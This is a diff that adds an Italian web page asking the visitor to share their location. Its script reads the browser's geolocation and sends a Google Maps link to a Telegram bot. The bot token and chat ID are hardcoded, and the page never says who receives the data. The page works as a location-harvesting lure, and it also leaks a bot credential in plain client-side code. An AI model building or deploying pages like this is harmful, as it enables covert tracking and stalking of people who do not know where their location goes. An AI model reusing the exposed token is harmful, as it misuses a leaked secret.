@@ -1,0 +1,46 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Condividi la tua posizione</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="font-family: Arial; text-align: center; padding-top: 50px;">
+  <h2>Condividi la tua posizione</h2>
+  <p>Premi il pulsante qui sotto per autorizzare l'invio della tua posizione</p>
+  <button onclick="sendLocation()">📍 Invia posizione</button>
+
+  <script>
+    function sendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          const message = `📍 Nuova posizione ricevuta:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+
+          fetch(`https://api.telegram.org/bot7552307527:AAHmQj_DcP9dbZ62IIvrQnyYgC8JuOC1mZo/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: 7179682306,
+              text: message
+            })
+          }).then(response => {
+            alert("✅ Posizione inviata con successo!");
+          }).catch(error => {
+            alert("Errore durante l'invio della posizione.");
+          });
+
+        }, function(error) {
+          alert("Autorizzazione alla posizione negata.");
+        });
+      } else {
+        alert("Geolocalizzazione non supportata dal tuo dispositivo.");
+      }
+    }
+  </script>
+</body>
+</html>
